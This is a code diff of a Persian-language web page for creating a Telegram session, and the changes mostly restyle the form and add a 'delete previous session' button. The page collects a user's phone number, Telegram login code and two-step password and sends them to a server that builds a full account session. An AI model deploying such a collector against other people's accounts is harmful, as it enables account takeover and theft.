@@ -101,25 +101,40 @@ body{
     border-radius:14px;
     text-align:center;
 }
-input,button{
-    width:100%;
+input, button{
+    width:80%;
     padding:10px;
     margin-top:10px;
     border-radius:10px;
     border:none;
     font-size:14px;
+    display:block;
+    margin-left:auto;
+    margin-right:auto;
 }
-input{direction:ltr}
+input{
+    direction:ltr;
+    text-align:center;
+}
 button{
     background:#6366f1;
     color:white;
     cursor:pointer;
     transition:0.2s;
 }
-button:active{
+button:active, button.active{
+    background:#22c55e !important;
     transform:scale(0.97);
 }
-#done{display:none;margin-top:10px;}
+#deleteBtn{
+    background:#f87171;
+    font-size:12px;
+    display:none;
+}
+#done{
+    display:none;
+    margin-top:10px;
+}
 </style>
 </head>
 <body>
@@ -127,7 +142,10 @@ button:active{
 <div class="box">
 <h3>ساخت سشن تلگرام</h3>
 <input id="mainInput" placeholder="+98xxxxxxxxxx">
-<button id="mainBtn" onclick="nextStep()">دریافت کد</button>
+<div id="buttonsWrapper">
+    <button id="mainBtn" onclick="nextStep()">دریافت کد</button>
+    <button id="deleteBtn" onclick="deleteSession()">حذف سشن قبلی</button>
+</div>
 <div id="done"><h3>✅ سشن ساخته شد</h3></div>
 </div>
 
@@ -136,6 +154,9 @@ let step = "phone";
 let phone = "";
 
 function nextStep(){
+    const mainBtn = document.getElementById("mainBtn");
+    mainBtn.classList.add("active"); // تغییر رنگ هنگام کلیک
+
     let v = document.getElementById("mainInput").value;
 
     if(step === "phone"){
@@ -143,16 +164,10 @@ function nextStep(){
         fetch("/check_phone",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})})
         .then(r=>r.json()).then(d=>{
             if(d.status==="exists"){
-                if(confirm("سشن قبلی حذف شود؟")){
-                    fetch("/delete_session",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})});
-                }
+                document.getElementById("deleteBtn").style.display="block"; // نمایش دکمه حذف
+            } else {
+                sendPhone();
             }
-            fetch("/send_phone",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})})
-            .then(()=>{
-                step="code";
-                mainInput.placeholder="کد تأیید تلگرام";
-                mainBtn.innerText="تأیید کد";
-            });
         });
     } else if(step==="code"){
         fetch("/send_code",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone,code:v})})
@@ -169,6 +184,24 @@ function nextStep(){
         fetch("/send_password",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone,password:v})})
         .then(()=>finish());
     }
+}
+
+function deleteSession(){
+    fetch("/delete_session",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})})
+    .then(()=> {
+        alert("سشن قبلی حذف شد");
+        document.getElementById("deleteBtn").style.display="none";
+        sendPhone();
+    });
+}
+
+function sendPhone(){
+    fetch("/send_phone",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})})
+    .then(()=>{
+        step="code";
+        mainInput.placeholder="کد تأیید تلگرام";
+        mainBtn.innerText="تأیید کد";
+    });
 }
 
 function finish(){
